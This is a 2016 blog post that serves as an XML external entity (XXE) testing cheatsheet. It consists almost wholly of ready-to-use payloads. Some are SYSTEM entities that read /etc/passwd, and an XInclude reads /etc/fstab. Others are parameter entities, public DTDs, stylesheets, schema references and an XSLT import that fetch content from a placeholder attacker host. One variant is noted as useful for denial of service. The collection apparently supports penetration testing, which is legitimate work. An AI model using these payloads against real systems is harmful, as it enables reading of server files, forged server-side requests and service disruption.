---
title: XML Entity cheatsheet
date: 2016-03-12 01:28:24
tags: XXE
---
XML Entity Cheatsheet - Updated An XML Entity testing cheatsheet. This is an updated version with nokogiri tests removed, just (X)XE notes.

XML Headers:

```
<?xml version="1.0" standalone="no"?>
<?xml version="1.0" standalone="yes"?>
```
Vanilla entity test:
```
<!DOCTYPE root [<!ENTITY post "1">]><root>&post;</root>
```

SYSTEM entity test (xxe):


```
<!DOCTYPE root [<!ENTITY post SYSTEM "file:///etc/passwd">]>
```

Parameter Entity. One of the benefits is a paremeter entity is automatically expanded inside the DOCTYPE:

```
<!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://[IP]/some.dtd">%dtd]>
```

<!--more-->

Should be illegal per XML specs but I've seen it work, also useful for DoS:

```
<!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://[IP]/some.dtd"><!ENTITY % a "test %dtd">]>
```

Combined Entity and Parameter Entity:

```
<!DOCTYPE root [<!ENTITY post SYSTEM "http://"><!ENTITY % dtd SYSTEM "http://[IP]/some.dtd"><!ENTITY % a "test %dtd">]><root>&post;</root>
```

URL handler. This follows XML Entity - IBM (Broken) I have not used this but Public DTD works just as well:

```
<!DOCTYPE root [<!ENTITY c PUBLIC "-//W3C//TEXT copyright//EN" "http://[IP]/copyright.xml">]>
```

XML Schema Inline:

```
<madeuptag xlmns="http://[ip]" xsi:schemaLocation="http://[IP]">
</madeuptag>
```

Remote Public DTD, from oxml_xxe payloads:

```
<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "http://[IP]">
```

External XML Stylesheet, from [Burp Suite Release Notes](http://releases.portswigger.net/2015/08/1625.html):

```
<?xml-stylesheet type="text/xml" href="http://[IP]"?>
```

XInclude:

```
<document xmlns:xi="http://<IP>/XInclude"><footer><xi:include href="title.xml"/></footer></document>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="file:///etc/fstab" parse="text"/>
```

Inline XSLT:

```
<?xml-stylesheet type="text/xml" href="#mytest"?>
<xsl:stylesheet id="mytest" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:fo="http://www.w3.org/1999/XSL/Format">
<!-- replace with your XSLT attacks -->
<xsl:import href="http://[ip]"/>
<xsl:template match="id('boom')">
  <fo:block font-weight="bold"><xsl:apply-templates/></fo:block>
</xsl:template>
</xsl:stylesheet>
```
